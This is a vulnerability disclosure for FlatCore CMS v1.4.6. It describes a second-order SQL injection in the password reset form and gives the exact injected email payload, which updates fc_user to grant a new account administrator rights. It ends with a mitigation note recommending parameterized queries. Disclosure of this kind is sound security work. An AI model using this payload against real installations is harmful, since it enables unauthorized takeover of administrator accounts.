**Exploit Title:** SQL Injection vulnerability (Users DB) on FlatCore v1.4.6

**Date:** 11-April-2017

**Exploit Author:** [@shardulm94](https://github.com/shardulm94)

**Software Link:** <https://github.com/flatCore/flatCore-CMS/archive/v1.4.6.zip>

**Version:** 1.4.6

**Description:**

SQL Injection allows an attacker to run malicious SQL statements on a database and thus being able to read or modify the data in the database. With enough privileges assigned to the database user, it can allow the attacker to delete tables or drop databases.

**Exploit:**

The vulnerability is due to a non-parameterized SQL query at <https://github.com/flatCore/flatCore-CMS/blob/master/core/password.php#L37>. This vulnerability along with missing validation on the email field of the registration and password reset forms can be used to create an administrator account with full privileges. We assume that FlatCore is installed at `http://localhost/flatcore/` and new registrations are enabled.

1. Go to `http://localhost/flatcore/register/`. Fill in the username `uname` and some password. Fill in the email fields as `'; UPDATE fc_user SET user_class='administrator', user_verified='verified', user_drm='||drm_acp_user|||||' WHERE user_nick='uname' --`. This step is required since the password reset form checks for valid emails in the DB before reset.
2. Since the register page uses parameterized query, the whole email string will be stored in the DB.
3. Now go to `http://localhost/flatcore/password/` and put in the email address mentioned while registering. Due to <https://github.com/flatCore/flatCore-CMS/blob/master/core/password.php#L36>, the query will effectively become `UPDATE fc_user SET user_reset_psw = '$reset_token' WHERE user_mail = ''; UPDATE fc_user SET user_class='administrator', user_verified='verified', user_drm='||drm_acp_user|||||' WHERE user_nick='uname' --`.
4. As you can see, this will set administrator as the user class for now newly created user `uname` and will also give it permissions to manage the user management screen.
5. Once inside the admin panel, the attacker can give himself extra privileges.

**Impact:** Read and modify the users database

**Mitigation:** Use of Parameterized SQL Queries and Validation on email fields
